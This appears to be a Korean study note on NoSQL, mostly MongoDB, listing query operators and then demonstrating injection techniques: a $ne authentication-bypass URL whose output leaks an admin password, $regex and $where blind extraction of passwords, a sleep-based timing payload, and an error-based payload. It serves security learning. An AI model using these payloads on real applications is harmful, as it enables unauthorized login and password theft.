# NoSQL

## MongoDB
### 특징
1. 스키마가 존재하지 않아 각 테이블에 특별한 정의를 하지 않아도 됨
2. JSON 형식으로 쿼리문 작성 가능
3. _id필드가 기본키 역할을 함
### vs MySQL
```sql
SELECT * FROM inventory WHERE status = "A" and qty < 30;
```
```MongoDB
db.inventory.find( { $and: [ { status: "A" }, { qty: { $lt: 30 } } ] } )
```
### 연산자
#### Comparsion
- $eq :지정된 값과 같은 값을 찾습니다. (equal)
- $gt : 지정된 값보다 큰 값을 찾습니다. (greater than)
- $gte : 지정된 값보다 크거나 같은 값을 찾습니다. (greater than equal)
- $in : 배열 안의 값들과 일치하는 값을 찾습니다. (in)
- $lt : 지정된 값보다 작은 값을 찾습니다. (less than)
- $lte : 지정된 값보다 작거나 같은 값을 찾습니다. (less than equal)
- $ne : 지정된 값과 같지 않은 값을 찾습니다. (not equal)
- $nin : 배열 안의 값들과 일치하지 않는 값을 찾습니다. (not in)

#### Logical
- $and : 논리적 AND, 각각의 쿼리를 모두 만족하는 문서가 반환됩니다.
- $not : 쿼리 식의 효과를 반전시킵니다. 쿼리 식과 일치하지 않는 문서를 반환합니다.
- $nor : 논리적 NOR, 각각의 쿼리를 모두 만족하지 않는 문서가 반환됩니다.
- $or : 논리적 OR, 각각의 쿼리 중 하나 이상 만족하는 문서가 반환됩니다.

#### Element
- $exists : 지정된 필드가 있는 문서를 찾습니다.
- $type : 지정된 필드가 지정된 유형인 문서를 선택합니다.

#### Evaluation
- $expr : 쿼리 언어 내에서 집계 식을 사용할 수 있습니다.
- $jsonSchema : 주어진 JSON 스키마에 대해 문서를 검증합니다.
- $mod : 필드 값에 대해 mod 연산을 수행하고 지정된 결과를 가진 문서를 선택합니다.
- $regex : 지정한 정규식과 일치하는 문서를 선택합니다.
- $text : 지정한 텍스트를 검색합니다.
- $where : 지정한 자바스크립트 식을 만족하는 문서와 일치합니다.

### 연산자를 이용한 공격 예시
```
http://localhost:3000/query?uid[$ne]=a&upw[$ne]=a
=> [{"_id":"5ebb81732b75911dbcad8a19","uid":"admin","upw":"secretpassword"}]
```

### Blind Injection
$regex와 $where를 통해 Blind Injection 수행
> db.user.find({upw: {$regex: "^a"}})
> db.user.find({upw: {$regex: "^b"}})
> db.user.find({upw: {$regex: "^c"}})

### where 조건 사용
$where을 통해 자바스크립트 식과 함께 데이터 비교. 단 필드 안에서는 사용할 수 없음. <br/>
> db.user.find({$where:"return 1==1"})
> { "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", "upw" : "guest" }
> db.user.find({uid:{$where:"return 1==1"}})
> error: {
>	"$err" : "Can't canonicalize query: BadValue $where cannot be applied to a field",
>	"code" : 17287
> }

### Blind Injection
> db.user.find({$where: "this.upw.substring(0,1)=='a'"})
> db.user.find({$where: "this.upw.substring(0,1)=='b'"})
> db.user.find({$where: "this.upw.substring(0,1)=='c'"})

> example
> 1. 길이 찾기
> {"uid" : "admin", "upw" : {"$regex" : ".{5}"}}
> 2. 비밀번호 추출하기
> {"uid": "admin", "upw": {"$regex":"^a"}}
> {"uid": "admin", "upw": {"$regex":"^aa"}}
> {"uid": "admin", "upw": {"$regex":"^ab"}}

### Time Based Injection
db.user.find({$where: `this.uid=='${req.query.uid}'&&this.upw=='${req.query.upw}'`}); 이런 코드로 조회하는 경우
> /?uid=guest'&&this.upw.substring(0,1)=='a'&&sleep(5000)&&'1
> /?uid=guest'&&this.upw.substring(0,1)=='b'&&sleep(5000)&&'1
> /?uid=guest'&&this.upw.substring(0,1)=='c'&&sleep(5000)&&'1

### Error Based Injection
> db.user.find({$where: "this.uid=='guest'&&this.upw.substring(0,1)=='g'&&asdf&&'1'&&this.upw=='${upw}'"});
error: {
	"$err" : "ReferenceError: asdf is not defined near '&&this.upw=='${upw}'' ",
	"code" : 16722
}
// this.upw.substring(0,1)=='g' 값이 참이기 때문에 asdf 코드를 실행하다 에러 발생
> db.user.find({$where: "this.uid=='guest'&&this.upw.substring(0,1)=='a'&&asdf&&'1'&&this.upw=='${upw}'"});
// this.upw.substring(0,1)=='a' 값이 거짓이기 때문에 뒤에 코드가 작동하지 않음


## Redis

## CouchDB